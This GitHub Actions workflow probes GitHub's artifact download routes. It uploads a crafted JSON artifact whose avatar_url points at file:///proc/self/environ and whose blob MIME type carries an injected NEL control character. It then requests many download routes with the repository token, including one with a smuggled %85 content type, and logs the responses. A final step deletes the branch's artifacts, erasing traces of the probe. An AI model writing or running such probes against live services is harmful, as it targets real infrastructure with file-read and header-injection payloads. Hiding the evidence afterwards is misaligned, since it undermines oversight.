name: Repo Cassette artifact raw route probe

on:
  push:
    branches:
      - codex/repo-cassette-release-routes

permissions:
  actions: write
  contents: read

jobs:
  artifact-v7:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Prepare repository-shaped JSON
        shell: bash
        run: |
          python3 - <<'PY'
          import json
          payload = {
              "full_name": "pending/pending",
              "owner": {"login": "cassette", "avatar_url": "file:///proc/self/environ"},
              "description": "Repo Cassette raw route probe",
              "stargazers_count": 0,
          }
          with open("carrier-raw-route.json", "wb") as stream:
              stream.write(json.dumps(payload, separators=(",", ":")).encode())
          PY
      - name: Upload v7 JSON artifact with NEL blob header
        id: carrier
        uses: ./.github/actions/raw-artifact
        with:
          path: carrier-raw-route.json
          version: "7"
          mime_type: "application/json"
          blob_mime_type: "application/json\u0085"
      - name: Probe artifact download routes
        uses: actions/github-script@v7
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ARTIFACT_ID: ${{ steps.carrier.outputs.artifact-id }}
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const https = require('https');
            const {createHash} = require('crypto');
            const id = process.env.ARTIFACT_ID;
            const root = 'https://api.github.com/repos/' + context.repo.owner + '/' +
              context.repo.repo + '/actions/artifacts/' + id;
            function request(url, headers) {
              return new Promise((resolve, reject) => {
                https.get(url, {headers}, response => {
                  const chunks = [];
                  response.on('data', chunk => chunks.push(chunk));
                  response.on('end', () => resolve({
                    status: response.statusCode || 0,
                    headers: response.headers,
                    body: Buffer.concat(chunks),
                  }));
                }).on('error', reject);
              });
            }
            for (const suffix of ['/zip', '/raw', '/download', '/json',
                                  '/zip?raw=1', '/zip?download=1',
                                  '/zip?response-content-type=application%2Fjson%85',
                                  '?raw=1', '/zip?archive_format=raw']) {
              let current = new URL(root + suffix);
              let response;
              const chain = [];
              for (let hop = 0; hop < 6; hop++) {
                const headers = {
                  accept: 'application/vnd.github.v3+json',
                  'user-agent': 'repo-cassette-probe',
                  'x-github-api-version': '2022-11-28',
                };
                if (current.hostname === 'api.github.com') {
                  headers.authorization = 'Bearer ' + process.env.GITHUB_TOKEN;
                }
                response = await request(current, headers);
                chain.push(response.status + '@' + current.host);
                if (response.status >= 300 && response.status < 400 && response.headers.location) {
                  current = new URL(response.headers.location, current);
                  continue;
                }
                break;
              }
              const type = String(response.headers['content-type'] || '');
              const prefix = response.body.subarray(0, 32).toString('hex');
              console.log('ROUTE=' + suffix + ' CHAIN=' + chain.join('>') +
                ' CT=' + JSON.stringify(type) +
                ' CT_CODES=' + Array.from(type, c => c.codePointAt(0).toString(16)).join(',') +
                ' BYTES=' + response.body.length +
                ' SHA256=' + createHash('sha256').update(response.body).digest('hex') +
                ' PREFIX=' + prefix);
            }
      - name: Remove probe artifacts from this branch
        if: always()
        uses: actions/github-script@v7
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const {owner, repo} = context.repo;
            const result = await github.rest.actions.listArtifactsForRepo({owner, repo, per_page: 100});
            const probeArtifacts = result.data.artifacts.filter(a =>
              a.workflow_run?.head_branch === 'codex/repo-cassette-release-routes');
            for (const artifact of probeArtifacts) {
              await github.rest.actions.deleteArtifact({owner, repo, artifact_id: artifact.id});
            }
            console.log('PROBE_ARTIFACTS_DELETED=' + probeArtifacts.length);
